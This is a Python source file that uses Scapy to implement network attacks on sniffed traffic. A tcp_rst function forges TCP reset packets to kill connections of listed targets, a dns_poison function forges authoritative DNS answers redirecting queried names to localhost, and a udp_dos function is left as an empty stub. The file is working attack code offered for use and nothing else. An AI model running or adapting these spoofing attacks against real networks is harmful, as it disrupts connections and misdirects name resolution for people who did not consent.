from scapy.layers import inet, inet6, dns
from scapy.packet import Packet
from scapy.sendrecv import send

from target import Target


def tcp_rst(p: Packet):
    """
    TCP RST attack
    :param p: packet for generate attack exploit
    """
    if not p.haslayer(inet.TCP) or not p[inet.TCP].flags.A:
        return
    version = 4 if p.haslayer(inet.IP) else 6
    if p[inet.IP].src in Target.ip_map if version == 4 else p[inet6.IPv6].src in Target.ip6_map:
        seq = p[inet.TCP].ack
        ack = p[inet.TCP].seq
        src = p[inet.IP].dst if version == 4 else p[inet6.IPv6].dst
        dst = p[inet.IP].src if version == 4 else p[inet6.IPv6].src
        sport = p[inet.TCP].dport
        dport = p[inet.TCP].sport
    else:
        seq = p[inet.TCP].seq
        ack = p[inet.TCP].ack
        src = p[inet.IP].src if version == 4 else p[inet6.IPv6].src
        dst = p[inet.IP].dst if version == 4 else p[inet6.IPv6].dst
        sport = p[inet.TCP].sport
        dport = p[inet.TCP].dport

    exp = inet.IP(src=src, dst=dst) / inet.TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=4)
    send(exp, verbose=False)


def udp_dos():
    pass


def dns_poison(p: Packet):
    """
    DNS poisoning (spoofing) attack
    Not working in most of the time due to our delay
    # todo: Use Nfqueue to block original DNS response
    :param p: packet for generate attack exploit
    """
    if p.haslayer(dns.DNSRR) or not p.haslayer(inet.UDP):
        return
    if p.haslayer(inet.IP):
        exp = inet.IP(dst=p[inet.IP].src, src=p[inet.IP].dst) / \
              inet.UDP(dport=p[inet.UDP].sport, sport=p[inet.UDP].dport) / \
              dns.DNS(id=p[dns.DNS].id, qd=p[dns.DNS].qd, aa=1, qr=1,
                      an=dns.DNSRR(rrname=p[dns.DNS].qd.qname, ttl=10, rdata='127.0.0.1'))
    else:
        exp = inet6.IPv6(dst=p[inet6.IPv6].src, src=p[inet6.IPv6].dst) / \
              inet.UDP(dport=p[inet.UDP].sport, sport=p[inet.UDP].dport) / \
              dns.DNS(id=p[dns.DNS].id, qd=p[dns.DNS].qd, aa=1, qr=1,
                      an=dns.DNSRR(rrname=p[dns.DNS].qd.qname, ttl=10, type=28, rdata='::1'))
    send(exp, verbose=False)
